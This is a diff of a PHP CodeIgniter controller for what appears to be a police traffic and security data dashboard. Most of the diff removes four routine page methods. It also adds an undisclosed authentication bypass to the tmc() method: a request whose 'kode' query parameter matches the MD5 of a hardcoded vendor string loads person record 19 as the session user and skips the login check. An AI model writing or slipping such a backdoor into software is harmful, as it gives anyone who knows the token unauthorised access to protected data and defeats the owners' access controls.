@@ -3,6 +3,9 @@ defined('BASEPATH') OR exit('No direct script access allowed');
 
 class Data extends CI_Controller {
 	
+	private $vendor = "Lenna Chat Bot 06-04-2021";
+	private $vendor_id = 19;
+	
 	public function __construct()
 	{
 		parent::__construct();
@@ -106,6 +109,8 @@ class Data extends CI_Controller {
 	public function tmc()
 	{
         $user=$this->session->userdata('user_data');
+		if ($this->input->get('kode') == md5($this->vendor)) $user = $this->db->get_where('persons',['rowid' => $this->vendor_id])->row_array();
+		
         $data['js_local'] = 'data/tmc/dashboard.js';
 		if(isset($user)){
 			$data['session'] = $user;
@@ -206,61 +211,4 @@ class Data extends CI_Controller {
 			$this->load->view('login',$data);
 		}
 	}
-	public function ketertiban() // index ketertiban
-	{
-        $user=$this->session->userdata('user_data');
-        $data['js_local'] = 'data/indeks/ketertiban.js';
-		if(isset($user)){
-			$data['session'] = $user;
-			$data['polda'] = $this->dares->get_polda()->result();
-			$this->template->load("data/indeks/ketertiban",$data);
-		}else{
-			$retval=array("403","Failed","Please login","error");
-			$data['retval']= $retval;
-			$this->load->view('login',$data);
-		}
-	}
-	public function kecelakaan() // index ketertiban
-	{
-        $user=$this->session->userdata('user_data');
-        $data['js_local'] = 'data/indeks/kecelakaan.js';
-		if(isset($user)){
-			$data['session'] = $user;
-			$data['polda'] = $this->dares->get_polda()->result();
-			$this->template->load("data/indeks/kecelakaan",$data);
-		}else{
-			$retval=array("403","Failed","Please login","error");
-			$data['retval']= $retval;
-			$this->load->view('login',$data);
-		}
-	}
-	public function keamanan() // index keamanan
-	{
-        $user=$this->session->userdata('user_data');
-        $data['js_local'] = 'data/indeks/keamanan.js';
-		if(isset($user)){
-			$data['session'] = $user;
-			$data['polda'] = $this->dares->get_polda()->result();
-			$this->template->load("data/indeks/keamanan",$data);
-		}else{
-			$retval=array("403","Failed","Please login","error");
-			$data['retval']= $retval;
-			$this->load->view('login',$data);
-		}
-	}
-	public function keselamatan() // index keselamatan
-	{
-        $user=$this->session->userdata('user_data');
-        $data['js_local'] = 'data/indeks/keselamatan.js';
-		if(isset($user)){
-			$data['session'] = $user;
-			$data['polda'] = $this->dares->get_polda()->result();
-			$this->template->load("data/indeks/keselamatan",$data);
-		}else{
-			$retval=array("403","Failed","Please login","error");
-			$data['retval']= $retval;
-			$this->load->view('login',$data);
-		}
-	}
-	
 }
